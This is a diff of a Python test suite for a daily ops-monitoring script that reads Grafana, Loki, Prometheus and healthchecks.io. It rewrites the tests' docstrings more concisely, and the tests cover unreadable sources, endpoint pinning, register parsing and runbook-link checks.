-    a source it could not read, the same inversion as a transport failure one line earlier.
-    """
+    """A 200 whose body changed shape is an unreadable source, not a `KeyError` past the guard."""
     bad = {"data": {"result": [{"metric": {}, "vaIue": [0, "1"]}]}}
     assert ops_daily.read_logs("tok", window=DAY, opener=_canned(bad)).unreadable
     checks = ops_daily.read_verdict("tok", opener=_canned(bad))
@@ -1361,12 +1268,8 @@ def test_a_shape_changed_payload_is_an_unreadable_source_not_a_crash():
 
 
 def test_a_vault_that_cannot_be_read_exits_2(monkeypatch, capsys):
-    """The vault is a source too, and its failure is not an `OSError`.
-
-    A locked GPG agent raises `CalledProcessError` -- a `SubprocessError` -- so `_UNREACHABLE` never
-    covered it, and `main` resolved the token outside any handler. That exited 1 with a traceback:
-    a credential the pass could not read, reported as a finding about the fleet.
-    """
+    """The vault is a source too: a locked GPG agent raises `CalledProcessError`, which `_UNREACHABLE`
+    does not cover, so the pass exits 2 and names it rather than exiting 1, the traceback kept on stderr."""
 
     def boom(*a, **k):
         raise subprocess.CalledProcessError(2, ["vault-pass.sh"])
@@ -1382,11 +1285,7 @@ def test_a_bad_since_suffix_is_a_usage_error_not_a_traceback():
 
 
 def test_a_truncated_sample_array_is_an_unreadable_source_too():
-    """`"value": [0]` raised `IndexError` past both parses — the same inversion, narrower trigger.
-
-    `read_deadmen` had named `IndexError` beside the tuple all along, so the file's own precedent
-    said where it belonged; it is in `_UNREACHABLE` now and that special case is gone.
-    """
+    """A sample array too short to index is an unreadable source, not an `IndexError` past the parse."""
     truncated = {"data": {"result": [{"metric": {}, "value": [0]}]}}
     assert ops_daily.read_logs("tok", window=DAY, opener=_canned(truncated)).unreadable
     assert ops_daily.read_deadmen("tok", opener=_canned(truncated)).unreadable
@@ -1408,14 +1307,9 @@ def test_a_truncated_sample_array_is_an_unreadable_source_too():
     ],
 )
 def test_a_history_frame_whose_time_column_drifted_is_read_not_fatal(schema, values):
-    """`line` was type-checked and `stamp` was not, and `stamp` is the more dangerous of the two.
-
-    This frame is the payload the module's own comments treat as least stable -- measured once
-    against the live API. `TypeError` is deliberately outside `_UNREACHABLE`, so an unguarded
-    division here takes the whole pass down with no report at all: exit 1, ATTENTION, for a source
-    it could not read. Reading no transitions from a frame it does not understand is the right
-    answer; crashing is not.
-    """
+    """A history frame whose `time` column drifted reads as no transitions and no unreadable source:
+    `TypeError` sits outside `_UNREACHABLE`, so an unguarded division would take the pass down with
+    no report at all."""
     read = ops_daily.read_alerts(
         "tok", now=NOW, window=DAY, opener=_canned(_rules(), {"schema": schema, "data": {"values": values}})
     )
@@ -1424,18 +1318,10 @@ def test_a_history_frame_whose_time_column_drifted_is_read_not_fatal(schema, val
 
 
 def test_every_endpoint_the_instrument_builds_is_pinned(monkeypatch):
-    """The blind spot closed in KIND, not by instance.
-
-    `_canned` never looked at the request, so a Prometheus query path shipped against a Loki
-    datasource and 404'd on the first live run while the suite stayed green. The module builds EIGHT
-    endpoints: the rules API, the chunked rule history, the dead-man Prometheus query, the direct
-    healthchecks.io read, the Loki log query, the verdict Prometheus query, and the reminders'
-    `increase()` and `resets()`. Six of them are asserted here; the log and the verdict reads are
-    pinned by `test_the_log_read_uses_lokis_query_path_not_prometheuss` and
-    `test_the_prometheus_reads_keep_the_prometheus_query_path`. Six plus two is the whole set, so a
-    path or a datasource uid cannot drift on any reader without a test saying so -- and a NINTH
-    reader added without a pin makes the enumeration above false, which is the sentence to re-read.
-    """
+    """Every endpoint the module builds is pinned by path and datasource uid -- here, or in
+    `test_the_log_read_uses_lokis_query_path_not_prometheuss` and
+    `test_the_prometheus_reads_keep_the_prometheus_query_path`. A reader added without a pin is
+    caught by nothing but this sentence."""
     monkeypatch.setenv("GRAFANA_LOKI_DS_UID", ops_daily.LOKI_DS_UID_DEFAULT)
     monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "k")
 
@@ -1466,19 +1352,14 @@ def test_every_endpoint_the_instrument_builds_is_pinned(monkeypatch):
 
 
 def test_the_journal_paragraph_carries_warnings_when_there_are_any():
-    """The paragraph is the journal's payload, and it summed only ERROR/CRITICAL.
-
-    Day one of the real pass had zero of those and 1201 WARNINGs on the capture primary — the only
-    finding of the day — and the paragraph the skill tells you to paste read "logs 0 ERROR/CRITICAL
-    lines". A month of entries would have recorded nothing. WARNING is where a healthy fleet talks.
-    """
+    """The journal paragraph counts WARNING beside ERROR/CRITICAL and keeps the two figures apart --
+    a healthy fleet talks in warnings."""
     logs = ops_daily.LogsRead(
         counts=[
             ops_daily.LogCount(host="zcrypto", container="capture", level="WARNING", count=1201),
             ops_daily.LogCount(host="zcrypto-red", container="capture", level="WARNING", count=601),
-            # An ERROR beside them, because a WARNING-only fixture leaves the LEVEL FILTER unpinned:
-            # summing every count instead of just the warnings survives such a suite, and a mutant
-            # folding ERROR into the WARNING figure would ship green.
+            # An ERROR beside them, or the LEVEL FILTER is unpinned: summing every count rather than
+            # just the warnings survives a WARNING-only fixture.
             ops_daily.LogCount(host="ops", container="liquidations", level="ERROR", count=2),
         ]
     )
@@ -1513,18 +1394,10 @@ def test_the_journal_paragraph_stays_quiet_when_nothing_warned():
 
 
 def _register(tmp_path, *rows, decoy=True, preamble=False):
-    """A register whose re-confirmation log holds `rows` (first-cell, fetched-at) -- plus, by default,
-    a dated table AFTER the next heading, so a parser that ignores section boundaries reads 2099.
-
-    The un-numbered `not a sweep row` sits INSIDE the log and LAST, where only `_LOG_ROW`'s `#\\d+`
-    rejects it: drop that clause and the parse answers 2000-01-01 instead of the real row, or
-    instead of None. Under an earlier heading it guarded nothing -- the section gate got there first.
-
-    `preamble=True` puts a well-formed row ABOVE the first heading, which is the only place the
-    gate's STARTING value can be read: every `## ` line reassigns `in_log`, so a row under a wrong
-    heading cannot tell a `False` initializer from a `True` one. Pass it with no rows in the log, or
-    the real rows overwrite the preamble's answer and the distinction disappears again.
-    """
+    """A register whose log holds `rows` (first-cell, fetched-at), plus by default a dated 2099 table
+    after the NEXT heading, which a parser blind to section boundaries reads. Two more placements: the
+    un-numbered row sits inside the log and LAST, where only `_LOG_ROW`'s `#\\d+` rejects it, and
+    `preamble=True`'s row sits above the FIRST heading -- pass it with no rows, or they outvote it."""
     text = [
         "# Kraken reference-data snapshot register",
         "",
@@ -1552,13 +1425,9 @@ def _register(tmp_path, *rows, decoy=True, preamble=False):
 
 
 def test_the_last_sweep_date_is_read_from_the_real_register_not_a_fixture_shaped_to_the_parser():
-    """The parse must find the committed file's latest row. Row #0 is 2026-07-07 and row #1 is
-    2026-08-04, so `>=` the latter proves the LAST row was read, and the bound never rots as sweeps
-    append. The second assertion re-derives the answer by a different mechanism -- slicing the
-    section out by heading rather than walking lines -- but honours the SAME boundary, so it can
-    disagree with `last_sweep_date` only when `last_sweep_date` is wrong. A whole-file scan here
-    would instead fail against a correct parser the day a numbered row appears under a later
-    heading, which is the case this test exists to defend."""
+    """`last_sweep_date` returns the committed register's LAST log row -- the bound is `>=` the second
+    row's date so it does not rot as sweeps append, and the assertion beside it re-derives the answer
+    by slicing the section out by heading, honouring the same boundary by a different mechanism."""
     found = ops_daily.last_sweep_date(ops_daily.REGISTER)
     assert found is not None and found >= date(2026, 8, 4), found
     log = ops_daily.REGISTER.read_text().split("\n## Re-confirmation log\n", 1)[1].split("\n## ", 1)[0]
@@ -1576,10 +1445,9 @@ def test_the_last_row_of_the_log_wins_and_tables_outside_it_are_ignored(tmp_path
 def test_a_log_with_no_dated_row_reads_as_none_never_as_a_date_from_elsewhere(tmp_path):
     assert ops_daily.last_sweep_date(_register(tmp_path)) is None
     assert ops_daily.last_sweep_date(_register(tmp_path, decoy=False)) is None
-    # Above the FIRST heading, where the gate's initializer is the only thing that can reject the
-    # row -- the two cases above are decided by a `## ` line reassigning `in_log`, so they pass
-    # unchanged if the gate starts open. A register's preamble is prose in practice; a table there
-    # is what a botched edit leaves behind.
+    # Above the FIRST heading, where only the gate's own initializer can reject the row -- the two
+    # cases above are decided by a `## ` line reassigning `in_log`, so they pass unchanged if the
+    # gate starts open.
     assert ops_daily.last_sweep_date(_register(tmp_path, preamble=True)) is None
 
 
@@ -1637,9 +1505,8 @@ def test_a_register_with_no_dated_row_is_an_unreadable_source_never_not_due(tmp_
 
 @pytest.mark.parametrize("value,owed,word", [("88.4", True, "moved ~+88.4 s"), ("0", False, "unchanged")])
 def test_the_healable_reminder_fires_only_when_the_counter_moved(tmp_path, value, owed, word):
-    """The trigger discriminates: a counter that did not move owes nothing, one that did names the
-    recount. The count itself stays the runbook's step 1, from the ledger -- Cloud cannot see it.
-    Two payloads: the increase, then `resets` (0 -- no reset in the window)."""
+    """The reminder is owed only when the counter moved, and its status names the movement -- two
+    payloads here: the `increase()`, then a `resets()` of 0."""
     read = ops_daily.read_reminders(
         "tok", now=NOW, window=DAY, opener=_canned(_counter(value), _counter(0)), register=_register(tmp_path, *_TWO_SWEEPS)
     )
@@ -1652,7 +1519,7 @@ def test_the_healable_reminder_fires_only_when_the_counter_moved(tmp_path, value
 def test_the_healable_reminder_names_a_counter_reset_and_never_quotes_it_as_movement(tmp_path):
     """A non-zero `resets()` in the window makes the paired `increase()` unquotable: the reminder is
     owed, its status names the reset, and the figure `increase()` returned never reaches the report
-    as movement. The two reads are paired precisely so the second can veto the first."""
+    as movement."""
     read = ops_daily.read_reminders(
         "tok", now=NOW, window=DAY, opener=_canned(_counter("18850.2"), _counter(1)), register=_register(tmp_path, *_TWO_SWEEPS)
     )
@@ -1671,25 +1538,17 @@ def test_a_healable_counter_with_no_series_is_unreadable_never_quiet(tmp_path):
 
 
 def test_the_real_register_yields_a_refdata_reminder():
-    """Against the committed file, with the counter canned: the pass's own default path parses.
-
-    No `tmp_path`, deliberately -- this test's entire value is that it omits `register=`, so the
-    committed `REGISTER` default is what gets exercised. A fixture parameter here is an invitation to
-    pass `register=_register(tmp_path, ...)` for consistency with its neighbours, which would delete
-    the only coverage of the path `main` actually takes."""
+    """The committed `REGISTER` default is what this exercises: it omits `register=` deliberately, so
+    giving it a `tmp_path` fixture would move it off the path `main` takes."""
     read = ops_daily.read_reminders("tok", now=NOW, window=DAY, opener=_canned(_counter(0)))
     assert read.unreadable is None, read.unreadable
     assert {r.name for r in read.reminders} == {"refdata sweep", "healable re-derivation"}
 
 
 def test_every_runbook_citation_the_instrument_itself_prints_resolves():
-    """Closed in KIND, not by instance: `REFDATA_RUNBOOK` and `HEALABLE_RUNBOOK` reach the operator's
-    report verbatim, and the repo's cross-reference guards scan `alerts.yaml`, `infra/grafana/*.json`
-    and `infra/runbooks/*.md` -- none of them scans `infra/scripts/`. Spec 00107 D6 rewrites both of
-    the sections cited here: a rename would turn the runbook-internal guard red and get it re-pointed
-    at the new anchor while this module's copy rotted silently, sending a paged operator to a fragment
-    that scrolls nowhere. Scanning the source keeps a citation added later covered by nobody's memory.
-    """
+    """Every `infra/runbooks/<file>#<anchor>` the instrument prints reaches a paged operator verbatim,
+    and a rename of a cited section -- spec 00107 D6 rewrote both -- would leave this module's copy
+    rotting silently, so the guard scans the module's source rather than pinning the constants."""
     cited = set(re.findall(r"infra/runbooks/([A-Za-z0-9._-]+\.md)#([A-Za-z0-9_-]+)", _SCRIPT.read_text()))
     assert cited, "no runbook citation found in the instrument -- this guard has gone vacuous, not clean"
     anchors = {f"{p.name}#{a}" for p in _RUNBOOKS.glob("*.md") for a in re.findall(r'<a name="([^"]+)"></a>', p.read_text())}
@@ -1756,9 +1615,9 @@ _CLEAN_DESC = f"Pings on a clean overlay-writer cycle. Runbook: {_GOOD_LINK}"
 
 
 def test_a_description_carrying_an_internal_token_is_a_finding_named_per_check():
-    """`operator-facing-text.md` governs this surface, read from a phone with nothing open -- and it is
-    the one surface no repo test reaches, because the descriptions are hand-written in a SaaS. Every
-    banned token in one description is its own finding, named per check; a clean one yields none."""
+    """`operator-facing-text.md` governs these descriptions, read from a phone with nothing open and
+    hand-written in a SaaS: every banned token in one description is its own finding, named per
+    check, and a clean description yields none."""
     checks = [
         {
             "name": "zcrypto-engine-shadow",
@@ -1780,14 +1639,9 @@ def test_a_description_carrying_an_internal_token_is_a_finding_named_per_check()
 
 
 def test_a_missing_or_dangling_runbook_link_is_a_finding():
-    """A link resolves against the FILE it names: an anchor living in a sibling file scrolls nowhere.
-    And the literal `Runbook: ` prefix is half of what spec 00107 D5 asks for -- a path mentioned in
-    passing is not the link an operator follows from a phone.
-
-    `passing-mention-first` is the pair the other fixtures cannot make: a RESOLVING mention ahead of
-    a DEAD link, so a check that searches the whole description finds the mention, passes, and sends
-    the operator to the fragment that scrolls nowhere. It is the link the prefix introduces that is
-    judged."""
+    """A finding is raised unless a `Runbook: ` prefix introduces a link whose anchor lives in the
+    file it names -- it is the prefixed link that is judged, so a resolving mention ahead of a dead
+    one does not rescue it."""
     checks = [
         {"name": "dangling", "desc": "Runbook: infra/runbooks/ops.md#no-such-anchor"},
         {"name": "wrong-file", "desc": "Runbook: infra/runbooks/capture.md#zcrypto-ops-archive-pull-stalled"},
@@ -1811,11 +1665,9 @@ def test_a_check_with_no_description_at_all_is_a_finding_not_a_pass():
 
 
 def test_a_working_link_is_not_a_finding_for_how_its_prefix_was_typed():
-    """The prefix marks a citation; it is not a formatting rule, and every spelling below sends the
-    operator to the same anchor. This check detects and cannot repair, so a description reported for
-    a link that works costs a finding line in every daily report until a human edits a hand-written
-    field that was never wrong -- the expensive direction, and the reason the prefix is the loose
-    half of the match while the `infra/runbooks/` path stays exact."""
+    """The prefix marks a citation, not a format: it is the loose half of the match while the
+    `infra/runbooks/` path stays exact, because this check detects and cannot repair -- a finding
+    against a link that works costs a line in every daily report until a human edits it."""
     checks = [
         {"name": "exact", "desc": f"Runbook: {_GOOD_LINK}"},
         {"name": "lower", "desc": f"runbook: {_GOOD_LINK}"},
@@ -1828,8 +1680,7 @@ def test_a_working_link_is_not_a_finding_for_how_its_prefix_was_typed():
 
 def test_every_prefixed_link_is_judged_not_only_the_first():
     """One citation resolving says nothing about the next: a description whose SECOND link is dead
-    still sends the operator to a fragment that scrolls nowhere. The finding names the dead link, so
-    a check that stopped at the first goes SILENT here rather than merely naming the wrong one."""
+    still sends the operator to a fragment that scrolls nowhere, and the finding names that link."""
     checks = [{"name": "second-dead", "desc": f"Runbook: {_GOOD_LINK} and Runbook: infra/runbooks/ops.md#no-such-anchor"}]
     assert ops_daily.check_descriptions(checks) == [
         "`second-dead`: its runbook link infra/runbooks/ops.md#no-such-anchor resolves to no anchor"
@@ -1856,12 +1707,9 @@ def test_the_deadmen_read_checks_the_descriptions_it_fetched(monkeypatch):
 
 
 def test_a_runbook_read_failure_during_the_descriptions_check_is_named_as_such_not_as_healthchecks(monkeypatch):
-    """The check reads runbook files; a failure there is a finding about the RUNBOOKS, and the
-    checks it fetched stay read -- never `healthchecks.io could not be read directly`.
-
-    `None` is not `[]`: a check that never ran must not print as one that ran and found nothing.
-    Exit 2 and the unreadable line already carry the truth, and a `descriptions: all 1 carry …`
-    line beside them says the opposite of what happened."""
+    """A runbook read that fails is a finding about the RUNBOOKS, the checks it fetched stay read, and
+    `description_findings` stays `None` -- a check that never ran must not print as one that ran and
+    found nothing."""
     monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "hcr_fake")
     monkeypatch.setattr(ops_daily, "check_descriptions", lambda checks: (_ for _ in ()).throw(OSError("runbooks unreadable")))
     prom = {"data": {"result": [{"metric": {}, "value": [1, "0"]}]}}
@@ -1873,11 +1721,9 @@ def test_a_runbook_read_failure_during_the_descriptions_check_is_named_as_such_n
 
 
 def test_a_description_finding_reaches_the_report_and_the_paragraph_and_never_blocks():
-    """Spec 00107 D5: the finding is a report line and a journal clause, never the exit code -- the
-    check cannot repair, and a SaaS description no repo change touches would hold the pass at
-    `attention` every day until a human logged in, destroying the all-clear entry the journal exists
-    to produce. VISIBILITY is therefore the whole guarantee, so both surfaces are pinned here, and so
-    is the verdict the operator reads above them."""
+    """Spec 00107 D5: a description finding is a report line and a journal clause, never the exit
+    code -- a hand-written SaaS field no repo change touches would otherwise hold the pass at
+    `attention` every day."""
     deadmen = ops_daily.DeadmenRead(
         via_prometheus=0.0,
         via_healthchecks=[{"name": "x"}],
@@ -1904,11 +1750,10 @@ def test_clean_descriptions_say_so_in_the_report_and_stay_out_of_the_paragraph()
 
 
 def test_todays_ten_real_descriptions_all_pass():
-    """The true positive: a check that refuses everything is not a check. `name`/`tags`/`desc` of the
-    ten live checks, read 2026-08-30 through the read-only key -- never the whole object, which
-    carries the check's write URL. This reads the committed fixture only: rewriting a description in
-    healthchecks.io moves nothing here until the fixture is re-fetched (the plan for spec 00107 says
-    how), and a red AFTER that re-fetch is the finding the daily pass would have made."""
+    """The true positive: a check that refuses everything is not a check. The fixture is
+    `name`/`tags`/`desc` only, fetched through the read-only key -- never the whole object, which
+    carries each check's write URL -- so a description rewritten in the SaaS moves nothing here until
+    it is re-fetched."""
     checks = json.loads((Path(__file__).resolve().parent / "fixtures" / "healthchecks_descriptions.json").read_text())
     assert len(checks) == 10, len(checks)
     assert ops_daily.check_descriptions(checks) == []
